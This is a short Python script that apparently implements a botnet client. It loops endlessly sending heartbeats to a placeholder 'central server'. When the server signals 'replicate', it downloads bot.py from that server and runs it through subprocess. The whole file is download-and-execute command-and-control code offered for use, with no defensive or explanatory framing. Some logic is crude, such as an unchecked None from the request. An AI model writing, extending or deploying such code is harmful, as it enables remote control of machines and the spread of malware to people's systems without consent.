import requests
import time
import os
import subprocess

# Define the central server URL
CENTRAL_SERVER_URL = 'http://your-server-address:5000'
BOT_SCRIPT_URL = 'http://your-server-address:5000/bot.py'

def send_request(command):
    try:
        response = requests.post(CENTRAL_SERVER_URL, json={'command': command})
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error sending request: {e}")
        return None

def download_bot_script():
    try:
        response = requests.get(BOT_SCRIPT_URL)
        with open('bot.py', 'wb') as f:
            f.write(response.content)
        return True
    except requests.exceptions.RequestException as e:
        print(f"Error downloading bot script: {e}")
        return False

def install_bot_script():
    try:
        subprocess.run(['pip', 'install', 'requests'], check=True)
        subprocess.run(['python', 'bot.py'], check=True)
        return True
    except subprocess.CalledProcessError as e:
        print(f"Error installing bot script: {e}")
        return False

def main():
    while True:
        # Send a heartbeat to the server
        send_request('heartbeat')
        time.sleep(5)

        # Check if the bot script should replicate
        if 'replicate' in send_request('check_replicate'):
            if download_bot_script():
                install_bot_script()

if __name__ == '__main__':
    main()
